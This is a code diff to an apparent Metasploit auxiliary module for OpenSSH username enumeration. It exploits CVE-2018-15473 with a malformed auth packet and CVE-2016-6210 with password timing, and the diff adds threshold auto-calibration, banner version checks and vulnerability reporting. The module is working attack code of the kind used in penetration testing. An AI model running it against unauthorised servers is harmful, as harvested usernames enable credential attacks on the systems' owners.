@@ -7,31 +7,39 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SSH
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::Module::Deprecated
+  moved_from 'auxiliary/scanner/ssh/ssh_enumusers'
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'SSH Username Enumeration',
+        'Name' => 'OpenSSH 7.6 And Earlier Username Enumeration',
         'Description' => %q{
           This module uses a malformed packet or timing attack to enumerate users on
           an OpenSSH server.
 
-          The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST
-          packet using public key authentication (must be enabled) to enumerate users.
+          The Malformed Packet action (default) sends a malformed (corrupted)
+          SSH_MSG_USERAUTH_REQUEST packet using public key authentication
+          (which needs to be enabled server-side). OpenSSH <= 7.6 responds
+          differently for valid vs. invalid users, exposing their existence
+          (CVE-2018-15473).
 
-          On some versions of OpenSSH under some configurations, OpenSSH will return a
-          "permission denied" error for an invalid user faster than for a valid user,
-          creating an opportunity for a timing attack to enumerate users.
+          The Timing Attack action submits an oversized password via
+          keyboard-interactive or password authentication. OpenSSH <= 7.2
+          with UsePAM enabled returns 'permission denied' faster for invalid
+          users than valid ones, exposing their existence via timing
+          (CVE-2016-6210).
 
-          Testing note: invalid users were logged, while valid users were not. YMMV.
+          NOTE: Invalid users were logged server side, while valid users were not. YMMV.
         },
         'Author' => [
           'kenkeiras',     # Timing attack
           'Dariusz Tytko', # Malformed packet
           'Michal Sajdak', # Malformed packet
           'Qualys',        # Malformed packet
-          'wvu'            # Malformed packet
+          'wvu',           # Malformed packet
+          'g0tmi1k' # @g0tmi1k - additional features
         ],
         'References' => [
           ['CVE', '2003-0190'],
@@ -48,14 +56,14 @@ class MetasploitModule < Msf::Auxiliary
           [
             'Malformed Packet',
             {
-              'Description' => 'Use a malformed packet',
+              'Description' => 'Use a malformed packet (OpenSSH <= 7.6, CVE-2018-15473)',
               'Type' => :malformed_packet
             }
           ],
           [
             'Timing Attack',
             {
-              'Description' => 'Use a timing attack',
+              'Description' => 'Use a timing attack (OpenSSH <= 7.2, CVE-2016-6210)',
               'Type' => :timing_attack
             }
           ]
@@ -97,6 +105,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_advanced_options(
       [
+        OptInt.new('CALIBRATE_COUNT',
+                   [
+                     false, 'Number of random-username samples used to auto-calibrate ' \
+                     'the timing threshold (timing attack only, 0 to disable)', 5
+                   ]),
         OptInt.new('RETRY_NUM',
                    [
                      true, 'The number of attempts to connect to a SSH server' \
@@ -125,7 +138,26 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def threshold
-    datastore['THRESHOLD']
+    @calibrated_threshold || datastore['THRESHOLD']
+  end
+
+  def calibrate_threshold(ip)
+    sample_count = datastore['CALIBRATE_COUNT']
+    return if sample_count.zero?
+
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Calibrating timing threshold with #{sample_count} samples...")
+    times = Array.new(sample_count) do
+      user = Rex::Text.rand_text_alphanumeric(8..32)
+      t0 = Time.now
+      attempt_user(user, ip)
+      Time.now - t0
+    end
+
+    mean = times.sum / times.size
+    variance = times.sum { |t| (t - mean)**2 } / times.size
+    stddev = Math.sqrt(variance)
+    @calibrated_threshold = (mean + 2 * stddev).ceil(2)
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Calibrated threshold: #{@calibrated_threshold}s (mean: #{mean.round(2)}s, jitter: #{stddev.round(2)}s)")
   end
 
   # Returns true if a nonsense username appears active.
@@ -168,7 +200,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue Net::SSH::AuthenticationFailed
       return :fail if technique == :malformed_packet
     rescue Net::SSH::Exception => e
-      vprint_error("#{e.class}: #{e.message}")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - #{e.class}: #{e.message}")
     end
 
     finish_time = Time.new
@@ -177,7 +209,9 @@ class MetasploitModule < Msf::Auxiliary
     when :malformed_packet
       return :success if ssh
     when :timing_attack
-      return :success if (finish_time - start_time > threshold)
+      elapsed = finish_time - start_time
+      vprint_status("User '#{user}' - #{elapsed.round(2)}s (threshold: #{threshold}s)")
+      return :success if elapsed > threshold
     end
 
     :fail
@@ -187,7 +221,17 @@ class MetasploitModule < Msf::Auxiliary
     Rex::Text.rand_text_english(64_000..65_000)
   end
 
-  def do_report(ip, user, _port)
+  def do_report(ip, rport, user)
+    report_vuln(
+      host: ip,
+      port: rport,
+      proto: 'tcp',
+      sname: 'ssh',
+      name: name,
+      info: "Found user '#{user}' via #{action.name}",
+      refs: references
+    )
+
     service_data = {
       address: ip,
       port: rport,
@@ -210,12 +254,6 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  # Because this isn't using the AuthBrute mixin, we don't have the
-  # usual peer method
-  def peer(rhost = nil)
-    "#{rhost}:#{rport} - SSH -"
-  end
-
   def user_list
     users = []
 
@@ -223,14 +261,16 @@ class MetasploitModule < Msf::Auxiliary
 
     if datastore['USER_FILE']
       fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE'])
-      users += File.read(datastore['USER_FILE']).split
+      file_users = File.read(datastore['USER_FILE']).split
+      vprint_status("Loaded #{file_users.size} users from #{datastore['USER_FILE']}")
+      users += file_users
     end
 
     if datastore['DB_ALL_USERS']
       if framework.db.active
-        framework.db.creds(workspace: myworkspace.name).each do |o|
-          users << o.public.username if o.public
-        end
+        db_users = framework.db.creds(workspace: myworkspace.name).filter_map { |o| o.public&.username }
+        vprint_status("Loaded #{db_users.size} users from database")
+        users += db_users
       else
         print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS')
       end
@@ -246,7 +286,7 @@ class MetasploitModule < Msf::Auxiliary
     while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))
       if attempt_num > 0
         Rex.sleep(2**attempt_num)
-        vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
+        vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Retrying '#{user}' due to connection error")
       end
 
       ret = check_user(ip, user, rport)
@@ -259,37 +299,80 @@ class MetasploitModule < Msf::Auxiliary
   def show_result(attempt_result, user, ip)
     case attempt_result
     when :success
-      print_good("#{peer(ip)} User '#{user}' found")
-      do_report(ip, user, rport)
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' found")
+      do_report(ip, rport, user)
     when :connection_error
-      vprint_error("#{peer(ip)} User '#{user}' could not connect")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' could not connect")
     when :fail
-      vprint_error("#{peer(ip)} User '#{user}' not found")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - User '#{user}' not found")
     end
   end
 
   def run
-    if user_list.empty?
-      fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE, USERNAME')
-    end
+    fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE and/or USERNAME') unless datastore['USERNAME'].present? || datastore['USER_FILE'] || datastore['DB_ALL_USERS']
 
     super
   end
 
+  def grab_banner(ip)
+    sock = Rex::Socket::Tcp.create(
+      'PeerHost' => ip,
+      'PeerPort' => rport,
+      'Context' => { 'Msf' => framework }
+    )
+    sock.get_once(256, 10)&.strip
+  rescue StandardError
+    nil
+  ensure
+    begin
+      sock&.close
+    rescue StandardError
+      nil
+    end
+  end
+
+  def check_banner_version(ip, banner)
+    return unless banner
+
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - SSH banner: #{banner}")
+    report_service(host: ip, port: rport, name: 'ssh', proto: 'tcp', info: banner)
+
+    report_ssh_host(banner, ip, rport)
+
+    match = banner.match(/OpenSSH[_ ](\d+\.\d+)/i)
+    return unless match
+
+    version = Rex::Version.new(match[1])
+    max_version, cve = case action['Type']
+                       when :malformed_packet then ['7.6', 'CVE-2018-15473']
+                       when :timing_attack then ['7.2', 'CVE-2016-6210']
+                       end
+
+    if version > Rex::Version.new(max_version)
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - OpenSSH #{match[1]} may NOT be vulnerable (#{action.name}/#{cve} affects <= #{max_version})")
+    else
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - OpenSSH #{match[1]} may be vulnerable to #{action.name}/#{cve}")
+    end
+  end
+
   def run_host(ip)
-    print_status("#{peer(ip)} Using #{action.name.downcase} technique")
+    users = user_list
+
+    banner = grab_banner(ip)
+    check_banner_version(ip, banner)
+
+    calibrate_threshold(ip) if action['Type'] == :timing_attack
+    print_warning("#{Rex::Socket.to_authority(rhost, rport)} - #{action.name} may be unreliable on low-latency networks (#{@calibrated_threshold}s)") if action['Type'] == :timing_attack && @calibrated_threshold && @calibrated_threshold < 3.0
 
     if datastore['CHECK_FALSE']
-      print_status("#{peer(ip)} Checking for false positives")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking for false positives")
       if check_false_positive(ip)
-        print_error("#{peer(ip)} throws false positive results. Aborting.")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - False positive check failed as server returned valid for a random username")
         return
       end
     end
 
-    users = user_list
-
-    print_status("#{peer(ip)} Starting scan")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Starting SSH username enumeration")
     users.each { |user| show_result(attempt_user(user, ip), user, ip) }
   end
 end
